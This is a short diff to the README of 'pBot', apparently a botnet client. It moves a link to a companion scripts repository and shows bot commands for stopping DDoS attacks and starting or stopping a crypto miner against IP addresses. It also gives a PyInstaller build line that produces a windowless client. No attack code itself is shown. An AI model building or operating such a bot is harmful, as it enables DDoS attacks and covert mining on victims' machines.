@@ -1,5 +1,4 @@
-# pBot Scripts -> https://github.com/rxu7s/pBot-Scripts
-
+# pBot
 ![image](https://user-images.githubusercontent.com/104208624/198850198-bba917b1-3135-430f-8b21-cbd987fcd48e.png)
 
 # Bot Commands
@@ -20,6 +19,9 @@
 * !stopddos.< ip >    # Stops DDOS Attack
 * !miner.< ip >   # Start miner  # Settings on Github
 * !stopminer.< ip >   # Stop miner
+
+# Scripts
+https://github.com/rxu7s/pBot-Scripts
 
 # How To Build
 PyInstaller --onefile --noconsole Client.py
